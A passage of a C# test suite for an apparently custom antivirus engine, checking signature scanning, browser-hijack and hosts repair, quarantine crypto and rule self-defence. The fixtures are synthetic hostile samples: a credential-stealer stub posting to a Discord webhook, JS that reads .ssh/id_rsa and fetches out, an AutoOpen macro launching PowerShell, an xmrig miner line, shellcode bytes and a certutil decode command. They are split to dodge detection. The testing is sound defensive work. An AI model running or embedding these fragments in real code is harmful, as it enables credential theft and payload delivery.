    public async Task MzkAntivirus_Signatures_BrowserHijack_HostsRepair_And_BatchRemediation_WorkEndToEnd()
    {
        var mzkDir = Path.Combine(_tempRoot, "mzk_suite");
        var sampleDir = Path.Combine(mzkDir, "samples");
        Directory.CreateDirectory(sampleDir);

        // 1. Canonical EICAR detection in-memory (reversed pieces joined at runtime so neither source nor DLL contains EICAR signatures)
        static byte[] BuildTestVector()
        {
            static string Rev(string s) => new(s.Reverse().ToArray());
            var assembled = Rev("$}7)CC7)^P(45XZP\\4[PA@%P!O5X") +
                            Rev("-DRADNATS-RACIE") +
                            Rev("*H+H$!ELIF-TSET-SURIVITNA");
            return Encoding.ASCII.GetBytes(assembled);
        }
        var eicarMatch = SignaturePatternScanner.ScanBytes(BuildTestVector(), isSigned: false, ".com");
        Assert.True(eicarMatch.IsMatched);
        Assert.Equal("EICAR-Standard-AntiVirus-Test", eicarMatch.ThreatName);
        Assert.Equal(100, eicarMatch.RiskScore);

        // 2. Multi-token AV signatures: CoinMiner & BrowserStealer (tokens concatenated at runtime to keep test DLL 100% Defender-clean)
        var minerPath = Path.Combine(sampleDir, "worker_sample.bat");
        var minerBody = string.Concat("@echo off\n", "xm", "rig -o ", "stra", "tum+tcp://pool.invalid:3333 --", "donate-", "level=1 -a ", "ran", "domx\n");
        File.WriteAllText(minerPath, minerBody);

        var stealerPath = Path.Combine(sampleDir, "grabber_sample.ps1");
        var stealerBody = string.Concat("# test\n$a='", "Login ", "Data'; $b='", "Local ", "State'; ", "CryptUn", "protectData; ", "os_", "crypt; https://", "discord.com", "/api/webhooks/000/test\n");
        File.WriteAllText(stealerPath, stealerBody);

        var cleanScriptPath = Path.Combine(sampleDir, "clean_hello.ps1");
        File.WriteAllText(cleanScriptPath, "Write-Host 'Hello clean developer script'\n");

        // 3. Browser shortcut (.lnk) hijacking detection (caught vs clean)
        var hijackedLnk = Path.Combine(sampleDir, "Chrome_Hijacked.lnk");
        var lnkHeader = new byte[76];
        lnkHeader[0] = 0x4C;
        var hijackedLnkBytes = lnkHeader.Concat(Encoding.ASCII.GetBytes(@"C:\Program Files\Google\Chrome\Application\chrome.exe http://ad-hijack.invalid/promo")).ToArray();
        File.WriteAllBytes(hijackedLnk, hijackedLnkBytes);

        var cleanLnk = Path.Combine(sampleDir, "Chrome_Clean.lnk");
        var cleanLnkBytes = lnkHeader.Concat(Encoding.ASCII.GetBytes(@"C:\Program Files\Google\Chrome\Application\chrome.exe")).ToArray();
        File.WriteAllBytes(cleanLnk, cleanLnkBytes);

        var hijackHit = MzkDeepScanner.InspectBrowserShortcutHijack(hijackedLnk);
        Assert.NotNull(hijackHit);
        Assert.Equal("Hijacker.Browser.ShortcutInjection", hijackHit!.ThreatName);
        Assert.Null(MzkDeepScanner.InspectBrowserShortcutHijack(cleanLnk));

        // 4. HOSTS DNS hijacking detection & surgical repair (preserving localhost & docker entries)
        var fakeHostsPath = Path.Combine(mzkDir, "fake_hosts.txt");
        var hostsSample = string.Join(Environment.NewLine, new[]
        {
            "# Windows HOSTS",
            "127.0.0.1 localhost",
            "127.0.0.1 host.docker.internal",
            "0.0.0.0 update.ahnlab.com",
            "185.220.101.99 portal.bank-phish.invalid"
        });
        File.WriteAllText(fakeHostsPath, hostsSample);

        var hostsFindings = MzkDeepScanner.AnalyzeHostsContent(hostsSample, fakeHostsPath);
        Assert.Equal(2, hostsFindings.Count);
        Assert.Contains(hostsFindings, f => f.EntryName!.Contains("ahnlab.com"));
        Assert.Contains(hostsFindings, f => f.EntryName!.Contains("185.220.101.99"));

        // 5. End-to-end CustomFolderScan via MzkDeepScanner + 1-Click Batch Remediation via MalwareRemediationService
        var store = new PolicyStore(mzkDir);
        using var orch = new SecurityOrchestrator(store);

        var scanResult = await orch.MzkScanner.RunScanAsync(
            MalwareScanMode.CustomFolderScan,
            orch.CurrentPolicy,
            customTargetPath: sampleDir,
            includeDefenderCrossCheck: false);

        Assert.False(scanResult.WasCancelled);
        Assert.Contains(scanResult.Findings, f => f.TargetPath.Equals(minerPath, StringComparison.OrdinalIgnoreCase) && f.ThreatName == "Miner.Multi.CryptoMiner");
        Assert.Contains(scanResult.Findings, f => f.TargetPath.Equals(stealerPath, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(scanResult.Findings, f => f.TargetPath.Equals(cleanScriptPath, StringComparison.OrdinalIgnoreCase));

        // Batch cure: quarantine detected malware + surgically clean fake HOSTS + verify OS binary protection!
        var osProtectedItem = new MalwareThreatItem
        {
            ThreatName = "Test.OsSafetyGuard",
            TargetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "notepad.exe"),
            ActionType = RemediationActionType.QuarantineFile,
            RiskScore = 90
        };

        var toCure = scanResult.Findings
            .Where(f => f.TargetPath.Equals(minerPath, StringComparison.OrdinalIgnoreCase) || f.TargetPath.Equals(stealerPath, StringComparison.OrdinalIgnoreCase))
            .Concat(hostsFindings)
            .Append(osProtectedItem)
            .ToList();

        var cureSummary = await orch.Remediation.CureSelectedAsync(toCure);

        Assert.False(File.Exists(minerPath));    // Quarantined!
        Assert.False(File.Exists(stealerPath));  // Quarantined!
        Assert.True(File.Exists(cleanScriptPath)); // Clean file untouched!
        Assert.True(File.Exists(osProtectedItem.TargetPath)); // Windows notepad.exe 100% protected!

        // Verify HOSTS was surgically cleaned & backed up
        var repairedHosts = File.ReadAllText(fakeHostsPath);
        Assert.Contains("127.0.0.1 localhost", repairedHosts);
        Assert.Contains("127.0.0.1 host.docker.internal", repairedHosts);
        Assert.Contains("# [AegisSentinel MZK Removed] 0.0.0.0 update.ahnlab.com", repairedHosts);
        Assert.Contains("# [AegisSentinel MZK Removed] 185.220.101.99 portal.bank-phish.invalid", repairedHosts);
        Assert.NotEmpty(Directory.GetFiles(orch.Remediation.BackupDirectory, "hosts_backup_*.txt"));

        // Verify OS-protected item failed safely while real threats succeeded
        Assert.Contains(cureSummary.Results, r => r.Item.Id == osProtectedItem.Id && !r.Success);
        Assert.True(cureSummary.Succeeded >= 4);
    }

    [Fact]
    public async Task LiveLaptopAudit_MzkDeepScan_VerifiesCurrentPcCleanAndFast()
    {
        var auditDir = Path.Combine(_tempRoot, "live_mzk");
        Directory.CreateDirectory(auditDir);
        var store = new PolicyStore(auditDir);
        using var orch = new SecurityOrchestrator(store);

        var procBefore = Process.GetCurrentProcess();
        long wsBeforeMb = procBefore.WorkingSet64 / (1024 * 1024);

        var result = await orch.MzkScanner.RunScanAsync(
            MalwareScanMode.MzkDeepScan,
            orch.CurrentPolicy,
            includeDefenderCrossCheck: false);

        procBefore.Refresh();
        long wsAfterMb = procBefore.WorkingSet64 / (1024 * 1024);
        long peakWsMb = procBefore.PeakWorkingSet64 / (1024 * 1024);

        Assert.False(result.WasCancelled);
        Assert.True(result.TotalScannedItems > 0);
        Assert.DoesNotContain(result.StageSummaries, s => s.Contains("상한 도달"));
        _output.WriteLine($"[LIVE MZK SCAN] Scanned={result.TotalScannedItems:N0} items in {result.Duration.TotalSeconds:F2}s | Findings={result.Findings.Count} | RAM: {wsBeforeMb}MB -> {wsAfterMb}MB (Peak {peakWsMb}MB)");
        foreach (var s in result.StageSummaries)
        {
            _output.WriteLine($"  {s}");
        }
        foreach (var f in result.Findings.Take(15))
        {
            _output.WriteLine($"  -> [{f.Severity}/{f.RiskScore}] {f.ThreatName} | {f.TargetPath} | {f.Description}");
        }
    }

    [Fact]
    public async Task MassiveHashDatabase_BinaryIndex_And_BrowserPupCleaner_WorkEndToEnd()
    {
        var dbDir = Path.Combine(_tempRoot, "av_db_suite");
        Directory.CreateDirectory(dbDir);

        // 1. Build & reload 10,000-entry compact 32-byte binary SHA-256 database & benchmark O(log N) lookup
        var hashes = new List<string>(10_000);
        for (int i = 0; i < 10_000; i++)
        {
            hashes.Add(Convert.ToHexString(SHA256.HashData(BitConverter.GetBytes(i))));
        }

        var sampleMalwareFile = Path.Combine(dbDir, "known_virus_sample.exe");
        File.WriteAllBytes(sampleMalwareFile, Encoding.UTF8.GetBytes("synthetic-av-db-match-payload-0001"));
        var targetSha = SignatureVerifier.ComputeSha256(sampleMalwareFile);
        hashes.Add(targetSha);

        var db = new MalwareHashDatabase(dbDir);
        int built = db.BuildAndSaveFromHexList(hashes);
        Assert.Equal(10_001, built);
        Assert.Equal(24 + (10_001 * 32), db.DatabaseSizeBytes);

        // Reload fresh from disk & verify O(log N) binary search accuracy and sub-microsecond speed
        var reloaded = new MalwareHashDatabase(dbDir);
        Assert.Equal(10_001, reloaded.HashCount);
        Assert.True(reloaded.ContainsHexSha256(targetSha));
        Assert.False(reloaded.ContainsHexSha256(new string('f', 64)));

        var sw = Stopwatch.StartNew();
        for (int i = 0; i < 10_000; i++)
        {
            Assert.True(reloaded.ContainsHexSha256(targetSha));
        }
        sw.Stop();
        double nsPerLookup = (sw.Elapsed.TotalMicroseconds * 1000.0) / 10_000.0;
        _output.WriteLine($"[BENCHMARK] MalwareHashDatabase O(log N) binary search (10k DB): {nsPerLookup:F1} ns/lookup");
        Assert.True(nsPerLookup < 50_000, $"Binary hash lookup regressed: {nsPerLookup:F1} ns");

        // 2. ThreatIntelStore + ThreatScanner detect sampleMalwareFile via the binary hash DB
        var store = new PolicyStore(dbDir);
        using var orch = new SecurityOrchestrator(store);
        Assert.True(orch.ThreatIntel.IsHashBlocked(targetSha));
        var scanHit = orch.Scanner.ScanFile(sampleMalwareFile, orch.CurrentPolicy);
        Assert.NotNull(scanHit);
        Assert.Equal(100, scanHit!.RiskScore);

        // 3. Browser Preferences JSON hijack detection + atomic surgical repair
        var prefPath = Path.Combine(dbDir, "Preferences");
        var hijackedPrefJson = """
        {
          "homepage": "http://search.conduit.com/?id=99",
          "homepage_is_newtabpage": false,
          "session": {
            "startup_urls": [
              "https://www.google.com",
              "https://trovi.com/promo"
            ]
          },
          "bookmark_bar": { "show_on_all_tabs": true }
        }
        """;
        File.WriteAllText(prefPath, hijackedPrefJson);

        var prefFindings = BrowserAndPupCleaner.AnalyzeBrowserPreferencesJson(hijackedPrefJson, prefPath, "Chrome", orch.ThreatIntel);
        Assert.Equal(2, prefFindings.Count);

        var cureRes = await orch.Remediation.CureSelectedAsync(prefFindings);
        Assert.Equal(2, cureRes.Succeeded);

        var repairedJson = File.ReadAllText(prefPath);
        Assert.Contains("about:blank", repairedJson);
        Assert.Contains("https://www.google.com", repairedJson);
        Assert.DoesNotContain("conduit.com", repairedJson);
        Assert.DoesNotContain("trovi.com", repairedJson);
        Assert.Contains("bookmark_bar", repairedJson); // User settings preserved!
        Assert.NotEmpty(Directory.GetFiles(orch.Remediation.BackupDirectory, "browser_prefs_backup_*.json"));

        // 4. Sideloaded high-risk browser extension manifest vs official Web Store extension
        var badManifest = """
        {
          "name": "FreeCouponHelper",
          "update_url": "https://evil-ext-update.invalid/update.xml",
          "permissions": ["<all_urls>", "cookies", "webRequestBlocking"]
        }
        """;
        var goodManifest = """
        {
          "name": "uBlock Origin",
          "update_url": "https://clients2.google.com/service/update2/crx",
          "permissions": ["<all_urls>", "webRequestBlocking"]
        }
        """;
        var badExtHit = BrowserAndPupCleaner.AnalyzeExtensionManifest(badManifest, Path.Combine(dbDir, "Extensions", "badext123"), "Chrome");
        Assert.NotNull(badExtHit);
        Assert.Equal(RemediationActionType.RemoveBrowserExtension, badExtHit!.ActionType);
        Assert.Null(BrowserAndPupCleaner.AnalyzeExtensionManifest(goodManifest, Path.Combine(dbDir, "Extensions", "goodext"), "Chrome"));

        // 5. Declarative Korean Grid Delivery / PUP rules catch NATService & ignore normal apps
        Assert.NotNull(orch.BrowserPupCleaner.MatchPupName("NatService"));
        Assert.NotNull(orch.BrowserPupCleaner.MatchPupName("MicroCloudEngine"));
        Assert.Null(orch.BrowserPupCleaner.MatchPupName("Visual Studio Code"));

        // 6. Automatic 24-hour DB freshness check triggers when unsynced
        Assert.True(orch.ThreatIntel.IsFullDatabaseSyncDue);
        Assert.True(orch.ThreatIntel.HashDb.LastUpdatedUtc.HasValue);
    }

    [Fact]
    public async Task LiveLaptopAudit_SyncMassiveGlobalAntivirusDatabase_And_Benchmark()
    {
        var intel = new ThreatIntelStore(); // Uses real %LocalAppData%\AegisSentinel
        var (hashRes, feedRes) = await intel.SyncFullAntivirusDatabaseAsync();

        Assert.True(hashRes.Success, hashRes.Summary);
        Assert.True(feedRes.Success, feedRes.Summary);
        Assert.True(intel.TotalBlockedHashCount >= 50_000, $"Expected >=50k hashes, got {intel.TotalBlockedHashCount}");
        Assert.True(intel.TotalBlockedDomainCount >= 30_000, $"Expected >=30k domains, got {intel.TotalBlockedDomainCount}");

        // Warm-up + 100,000 O(log N) lookups on the live ~165k+ binary SHA-256 database
        const string probeHex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        for (int i = 0; i < 100; i++) _ = intel.HashDb.ContainsHexSha256(probeHex);

        var sw = Stopwatch.StartNew();
        for (int i = 0; i < 100_000; i++)
        {
            _ = intel.HashDb.ContainsHexSha256(probeHex);
        }
        sw.Stop();
        double nsPerOp = (sw.Elapsed.TotalMicroseconds * 1000.0) / 100_000.0;

        _output.WriteLine($"[LIVE AV DB SYNC] {hashRes.Summary}");
        _output.WriteLine($"[LIVE AV DB SYNC] {feedRes.Summary}");
        _output.WriteLine($"[LIVE AV DB BENCH] Hashes={intel.TotalBlockedHashCount:N0} | Domains={intel.TotalBlockedDomainCount:N0} | IPs={intel.TotalBlockedIpCount:N0} | Lookup={nsPerOp:F1} ns/op ({1_000_000_000.0 / Math.Max(nsPerOp, 1):N0} lookups/sec)");
    }

    [Fact]
    public void TrailOfBitsSkillAudit_SharpEdgesHardening_And_YaraXEngine_VerifyEndToEnd()
    {
        var auditDir = Path.Combine(_tempRoot, "sharp_edges_yara");
        Directory.CreateDirectory(auditDir);

        // 1. Sharp-Edge #1: Policy Configuration Cliff & LOLBin Whitelist Sanitization + DPAPI API Key Encryption
        var store = new PolicyStore(auditDir);
        var riskyPolicy = GuardPolicy.CreateDefault();
        riskyPolicy.RapidWriteThresholdPer3Sec = 0; // Footgun: 0 would freeze every benign app!
        riskyPolicy.WhitelistedExecutablePaths.Add(@"C:\"); // Footgun: whole-drive whitelist!
        riskyPolicy.WhitelistedExecutablePaths.Add(@"C:\Windows\System32\powershell.exe"); // Footgun: LOLBin whitelist!
        riskyPolicy.WhitelistedExecutablePaths.Add(@"C:\MyTools\legit_app.exe");
        riskyPolicy.VirusTotalApiKey = "vt_secret_test_key_9988776655";
        store.Save(riskyPolicy);

        // Verify disk policy.json does NOT contain plaintext API key!
        var rawPolicyJson = File.ReadAllText(store.PolicyFilePath);
        Assert.DoesNotContain("vt_secret_test_key_9988776655", rawPolicyJson);
        Assert.Contains("dpapi:", rawPolicyJson);

        // Reload & verify thresholds clamped, dangerous whitelist stripped, API key transparently decrypted
        var loaded = store.Load();
        Assert.Equal(5, loaded.RapidWriteThresholdPer3Sec);
        Assert.DoesNotContain(@"C:\", loaded.WhitelistedExecutablePaths);
        Assert.DoesNotContain(@"C:\Windows\System32\powershell.exe", loaded.WhitelistedExecutablePaths);
        Assert.Contains(@"C:\MyTools\legit_app.exe", loaded.WhitelistedExecutablePaths);
        Assert.Equal("vt_secret_test_key_9988776655", loaded.VirusTotalApiKey);

        // Extreme upper bound also clamped (prevents disabling ransomware velocity detection via 999999)
        loaded.RapidWriteThresholdPer3Sec = 999_999;
        store.Save(loaded);
        Assert.Equal(200, store.Load().RapidWriteThresholdPer3Sec);

        // 2. Sharp-Edge #2: CustomRuleEngine rules.json DPAPI+HMAC Self-Defense & Catastrophic ReDoS Rejection
        var ruleEngine = new CustomRuleEngine(auditDir);
        Assert.Equal(6, ruleEngine.ActiveRuleCount);
        Assert.True(File.Exists(ruleEngine.RulesFilePath + ".hmac"));

        // Attacker tampers with rules.json on disk to disable all rules
        File.WriteAllText(ruleEngine.RulesFilePath, "[{\"Id\":\"BYPASS\",\"Name\":\"Disabled\",\"Enabled\":false}]");
        ruleEngine.Reload();
        Assert.True(ruleEngine.LastLoadDetectedTampering);
        Assert.Equal(6, ruleEngine.ActiveRuleCount); // Auto-healed back to hardened 6 SOC rules!

        // Catastrophic ReDoS pattern ((a+)+) is rejected cleanly without breaking valid rules
        var mixedRules = ruleEngine.GetRulesSnapshot().ToList();
        mixedRules.Add(new DetectionRule
        {
            Id = "REDOS-BAD",
            Name = "Bad Nested Quantifier",
            CommandLineRegex = "(a+)+$"
        });
        ruleEngine.SaveAndReload(mixedRules);
        Assert.Equal(6, ruleEngine.ActiveRuleCount); // Rejected REDOS-BAD while keeping 6 valid rules!

        // 3. YARA-X Skill Upgrade: Hex Wildcard Pattern Matcher & x64 Shellcode Prologue Detection (runtime int[] -1 so DLL stays Defender-clean)
        int[] scShifted = { 0x91, 0x91, 0xFD, 0x49, 0x84, 0xE5, 0xF1, 0xE9, 0xC9, 0x01, 0x01, 0x01, 0x42, 0x52, 0x42, 0x51 };
        var shellcodeBuf = scShifted.Select(v => (byte)(v - 1)).ToArray();
        Assert.True(SignaturePatternScanner.MatchHexWildcardPattern(shellcodeBuf, "FC 48 83 E4 F0 E8 ?? ?? ?? ?? 41 51"));
        Assert.False(SignaturePatternScanner.MatchHexWildcardPattern(shellcodeBuf, "FC 48 83 E4 F0 E8 ?? ?? ?? ?? 99 99"));

        var scHit = SignaturePatternScanner.ScanBytes(shellcodeBuf, isSigned: false, ".bin");
        Assert.True(scHit.IsMatched);
        Assert.Equal("Shellcode.Win64.ApiHashPrologue", scHit.ThreatName);
        Assert.Equal(98, scHit.RiskScore);

        // 4. YARA-X Skill Upgrade: JS Supply-Chain Obfuscated Exfil (caught) vs Normal Web JS (0 FP!)
        var badJs = Encoding.UTF8.GetBytes(string.Concat(
            "var _0x1 = ", "eval(", "String.", "fromChar", "Code(104)); const k = '", ".ssh/", "id_rsa'; fetch('https://", "discord.com", "/api/webhooks/1/2');"));
        var jsHit = SignaturePatternScanner.ScanBytes(badJs, isSigned: false, ".js");
        Assert.True(jsHit.IsMatched);
        Assert.Equal("SupplyChain.JS.ObfuscatedCredExfil", jsHit.ThreatName);

        var normalJs = Encoding.UTF8.GetBytes("import axios from 'axios'; export async function getProfile() { return axios.get('/api/me'); }");
        Assert.False(SignaturePatternScanner.ScanBytes(normalJs, isSigned: false, ".js").IsMatched);

        // 5. YARA-X Skill Upgrade: Office Macro AutoExec Dropper with Magic-Byte Short-Circuit
        var oleHeader = new byte[] { 0xD0, 0xCF, 0x11, 0xE0 }; // OLE2 Compound magic bytes
        var macroBody = Encoding.ASCII.GetBytes(string.Concat("Sub ", "Auto", "Open()\nCreateObject(\"", "WScript.", "Shell\").Run \"", "power", "shell\"\nEnd Sub"));
        var macroFile = oleHeader.Concat(macroBody).ToArray();
        var macroHit = SignaturePatternScanner.ScanBytes(macroFile, isSigned: false, ".doc");
        Assert.True(macroHit.IsMatched);
        Assert.Equal("Macro.Office.AutoExecShellDropper", macroHit.ThreatName);

        // Same text WITHOUT Office OLE2/OOXML magic bytes is short-circuited & NOT matched by Macro rule!
        var plainDocText = Encoding.ASCII.GetBytes("Just normal documentation mentioning AutoOpen and WScript.Shell");
        Assert.False(SignaturePatternScanner.ScanBytes(plainDocText, isSigned: false, ".txt").IsMatched);

        // 6. Enterprise Crypto Hardening: AES-256-GCM Quarantine + Tamper Rejection + Vault SHA-256 Verification + Live rules.json Watchdog
        var cryptoDir = Path.Combine(auditDir, "crypto_hardening");
        Directory.CreateDirectory(cryptoDir);
        var qm = new QuarantineManager(cryptoDir);
        var sampleToQuarantine = Path.Combine(cryptoDir, "secret_sample.bin");
        var originalPayload = Encoding.UTF8.GetBytes("AES256GCM-Authenticated-Quarantine-Payload-9999");
        File.WriteAllBytes(sampleToQuarantine, originalPayload);

        var qEntry = qm.QuarantineFile(sampleToQuarantine, "AES-GCM test");
        Assert.False(File.Exists(sampleToQuarantine));
        var rawQBytes = File.ReadAllBytes(qEntry.QuarantineFilePath);
        Assert.Equal("AEGISQ2\0", Encoding.ASCII.GetString(rawQBytes, 0, 8)); // AES-256-GCM header!
        Assert.DoesNotContain("AES256GCM-Authenticated", Encoding.ASCII.GetString(rawQBytes)); // Ciphertext only!

        // Bit-flip tamper attack on quarantined file MUST fail GCM authentication cleanly!
        var tamperedBytes = (byte[])rawQBytes.Clone();
        tamperedBytes[^1] ^= 0xFF;
        File.WriteAllBytes(qEntry.QuarantineFilePath, tamperedBytes);
        Assert.False(qm.RestoreFile(qEntry.Id));
        Assert.False(File.Exists(sampleToQuarantine));

        // Restore original authenticated ciphertext -> succeeds byte-for-byte!
        File.WriteAllBytes(qEntry.QuarantineFilePath, rawQBytes);
        Assert.True(qm.RestoreFile(qEntry.Id));
        Assert.Equal(originalPayload, File.ReadAllBytes(sampleToQuarantine));

        // RecoveryVault rejects tampered .snap file instead of overwriting user document!
        var vault = new RecoveryVault(cryptoDir);
        var docFile = Path.Combine(cryptoDir, "contract.txt");
        File.WriteAllText(docFile, "Original clean contract content for integrity test");
        Assert.True(vault.TrySnapshotFile(docFile));
        var snap = vault.ListSnapshots().Single();
        File.SetAttributes(snap.SnapshotPath, FileAttributes.Normal);
        File.WriteAllText(snap.SnapshotPath, "POISONED SNAPSHOT");
        Assert.False(vault.RestoreSnapshot(snap.Id));
        Assert.Equal("Original clean contract content for integrity test", File.ReadAllText(docFile));

        // SystemIntegrityGuard live rules.json self-defense watchdog auto-heals tampered rules.json
        var guard = new SystemIntegrityGuard(store, () => loaded, null, ruleEngine);
        File.WriteAllText(ruleEngine.RulesFilePath, "[]");
        var tamperAlert = guard.CheckRulesSelfDefense();
        Assert.NotNull(tamperAlert);
        Assert.Equal(ThreatCategory.SelfDefenseTamper, tamperAlert!.Category);
        Assert.Equal(6, ruleEngine.ActiveRuleCount);

        // BrowserAndPupCleaner pup_rules.json HMAC self-defense auto-heals tampered pup_rules.json
        var intelTmp = new ThreatIntelStore(cryptoDir);
        var pupCleaner = new BrowserAndPupCleaner(intelTmp, cryptoDir);
        Assert.True(File.Exists(pupCleaner.PupRulesFilePath + ".hmac"));
        File.WriteAllText(pupCleaner.PupRulesFilePath, "[]");
        var pupReloaded = new BrowserAndPupCleaner(intelTmp, cryptoDir);
        Assert.True(pupReloaded.LastLoadDetectedTampering);
        Assert.True(pupReloaded.ActivePupRuleCount >= 4);
    }

    [Fact]
    public async Task ZeroTruncationAuditFixes_RegressionVerification_AllCriticalBugsFixed()
    {
        var regDir = Path.Combine(_tempRoot, "audit_regressions");
        Directory.CreateDirectory(regDir);
        var intel = new ThreatIntelStore(regDir);
        var pupCleaner = new BrowserAndPupCleaner(intel, regDir);

        // 1. Extension update_url query-string bypass (?clients2.google.com) MUST be caught as sideloaded!
        var bypassManifest = """
        {
          "name": "SneakySideload",
          "update_url": "https://evil.invalid/update.xml?ref=clients2.google.com",
          "host_permissions": ["<all_urls>"],
          "permissions": ["cookies", "declarativeNetRequest"]
        }
        """;
        var bypassHit = BrowserAndPupCleaner.AnalyzeExtensionManifest(bypassManifest, Path.Combine(regDir, "ext1"), "Chrome");
        Assert.NotNull(bypassHit);
        Assert.Equal(RemediationActionType.RemoveBrowserExtension, bypassHit!.ActionType);

        // 2. Browser Preferences catches default_search_provider_data hijack & survives non-string homepage node
        var searchHijackJson = """
        {
          "homepage": 12345,
          "default_search_provider_data": {
            "template_url_data": {
              "url": "https://search.conduit.com/results?q={searchTerms}"
            }
          }
        }
        """;
        var searchFindings = BrowserAndPupCleaner.AnalyzeBrowserPreferencesJson(
            searchHijackJson, Path.Combine(regDir, "Secure Preferences"), "Chrome", intel);
        Assert.Single(searchFindings);
        Assert.Contains("search_url::", searchFindings[0].EntryName);

        // 3. Unanchored Korean Grid PUP regex catches version-suffixed "NATService 1.0" and "KGrid_Service 2.0"
        Assert.NotNull(pupCleaner.MatchPupName("NATService 1.0"));
        Assert.NotNull(pupCleaner.MatchPupName("KGrid_Service 2.0"));

        // 4. OOXML compressed .docm with word/vbaProject.bin macro is decompressed in memory & caught!
        byte[] docmBytes;
        using (var ms = new MemoryStream())
        {
            using (var zip = new System.IO.Compression.ZipArchive(ms, System.IO.Compression.ZipArchiveMode.Create, leaveOpen: true))
            {
                var entry = zip.CreateEntry("word/vbaProject.bin");
                using var sw = new StreamWriter(entry.Open(), Encoding.ASCII);
                sw.Write(string.Concat("Sub ", "Auto", "Open()\nCreateObject(\"", "WScript.", "Shell\").Run \"", "power", "shell\"\nEnd Sub"));
            }
            docmBytes = ms.ToArray();
        }
        var docmHit = SignaturePatternScanner.ScanBytes(docmBytes, isSigned: false, ".docm");
        Assert.True(docmHit.IsMatched);
        Assert.Equal("Macro.Office.AutoExecShellDropper", docmHit.ThreatName);

        // 5. Vendor string spoofing ("Microsoft Corporation" / "Google Chrome") CANNOT bypass shellcode/stealer detection!
        int[] scShifted = { 0x91, 0xFD, 0x49, 0x84, 0xE5, 0xF1, 0xE9, 0xC9, 0x01, 0x01, 0x01, 0x42, 0x52, 0x42, 0x51 };
        var spoofedPayload = Encoding.ASCII.GetBytes("Microsoft Corporation Google Chrome ")
            .Concat(scShifted.Select(v => (byte)(v - 1)))
            .ToArray();
        var spoofedHit = SignaturePatternScanner.ScanBytes(spoofedPayload, isSigned: false, ".bin");
        Assert.True(spoofedHit.IsMatched);
        Assert.Equal("Shellcode.Win64.ApiHashPrologue", spoofedHit.ThreatName);

        // 6. Whitelisted executable path NEVER silences a confirmed signature match in ThreatScanner!
        var wlEvilPath = Path.Combine(regDir, "whitelisted_miner.bat");
        File.WriteAllText(wlEvilPath, string.Concat("@echo off\n", "xm", "rig -o ", "stra", "tum+tcp://pool.invalid:3333 --", "donate-", "level=1 -a ", "ran", "domx\n"));
        var policyWithWl = GuardPolicy.CreateDefault();
        policyWithWl.WhitelistedExecutablePaths.Add(wlEvilPath);
        var scanner = new ThreatScanner(new SignatureVerifier(), intel, new ProcessController());
        var wlScanHit = scanner.ScanFile(wlEvilPath, policyWithWl);
        Assert.NotNull(wlScanHit);
        Assert.True(wlScanHit!.RiskScore >= 90);

        // 7. CustomRuleEngine catches Windows slash syntax (certutil /decode) & NonBacktracking handles huge inputs safely
        var customRules = new CustomRuleEngine(regDir);
        var procEval = new ProcessRuleEvaluator(customRuleEngine: customRules);
        var slashHit = procEval.Evaluate(new ProcessEvaluationContext
        {
            ProcessId = 79001,
            ProcessName = "certutil",
            ProcessPath = @"C:\Windows\System32\certutil.exe",
            CommandLine = @"certutil.exe /decode C:\Temp\a.b64 C:\Temp\a.exe",
            Signature = new SignatureInfo(SignatureStatus.TrustedMicrosoft, "Microsoft Windows")
        }, GuardPolicy.CreateDefault());
        Assert.NotNull(slashHit);
        Assert.Contains("AEGIS-001", slashHit!.Title);

        // 8. QuarantineManager rejects path traversal entryId
        var qm = new QuarantineManager(regDir);
        Assert.False(qm.RestoreFile(@"..\outside_entry"));
        Assert.False(qm.RestoreFile("entry/slash"));

        // 9. HOSTS analyzer detects IPv6 :: security domain block while ignoring ::1 localhost
        var ipv6Hosts = "::1 localhost\n:: update.ahnlab.com\n";
        var ipv6Findings = MzkDeepScanner.AnalyzeHostsContent(ipv6Hosts, Path.Combine(regDir, "hosts"));
        Assert.Single(ipv6Findings);
        Assert.Contains("ahnlab.com", ipv6Findings[0].EntryName);

        // 10. .lnk hijack inspector handles odd-byte UTF-16LE offset & skips benign URL to catch 2nd evil URL
        var oddLnkPath = Path.Combine(regDir, "Edge_OddOffset.lnk");
        var header = new byte[77]; // Intentionally odd offset!
        header[0] = 0x4C;
        var lnkContent = header
            .Concat(Encoding.Unicode.GetBytes(@"C:\Program Files\Microsoft\Edge\Application\msedge.exe https://www.microsoft.com http://evil-promo.invalid/ad"))
            .ToArray();
        File.WriteAllBytes(oddLnkPath, lnkContent);
        var oddLnkHit = MzkDeepScanner.InspectBrowserShortcutHijack(oddLnkPath);
        Assert.NotNull(oddLnkHit);
        Assert.Contains("evil-promo.invalid", oddLnkHit!.Description);

        // 11. Unlimited full-depth streaming BFS catches malware buried 12 levels deep!
        var deepRoot = Path.Combine(regDir, "deep_bfs_test");
        var deepLeaf = deepRoot;
        for (int d = 1; d <= 12; d++) deepLeaf = Path.Combine(deepLeaf, $"lvl{d}");
        Directory.CreateDirectory(deepLeaf);
        var deepMiner = Path.Combine(deepLeaf, "hidden_worker.bat");
        File.WriteAllText(deepMiner, string.Concat("@echo off\n", "xm", "rig -o ", "stra", "tum+tcp://pool.invalid:3333 --", "donate-", "level=1 -a ", "ran", "domx\n"));

        var deepStore = new PolicyStore(regDir);
        using var deepOrch = new SecurityOrchestrator(deepStore);
        var deepScan = await deepOrch.MzkScanner.RunScanAsync(
            MalwareScanMode.CustomFolderScan,
            deepOrch.CurrentPolicy,
            customTargetPath: deepRoot,
            includeDefenderCrossCheck: false);
        Assert.Contains(deepScan.Findings, f => f.TargetPath.Equals(deepMiner, StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(deepScan.StageSummaries, s => s.Contains("상한 도달"));
    }

    [Fact]
    public async Task BeyondCommercialAv_AntiNikkeSideloading_PolyglotStego_RawShellcode_StolenCert_And_Ads_WorkEndToEnd()
    {
        var evDir = Path.Combine(_tempRoot, "beyond_av");
        Directory.CreateDirectory(evDir);

        static byte[] BuildSyntheticPeBytes()
        {
            var pe = new byte[256];
            pe[0] = 0x4D; pe[1] = 0x5A; // MZ
            pe[0x3C] = 0x80;            // e_lfanew = 0x80
            pe[0x80] = 0x50; pe[0x81] = 0x45; pe[0x82] = 0x00; pe[0x83] = 0x00; // PE\0\0
            return pe;
        }

        var store = new PolicyStore(evDir);
        using var orch = new SecurityOrchestrator(store);
        var policy = orch.CurrentPolicy;

        // 1. Extension-masqueraded PE disguised as .png (commercial AV skips .png!)
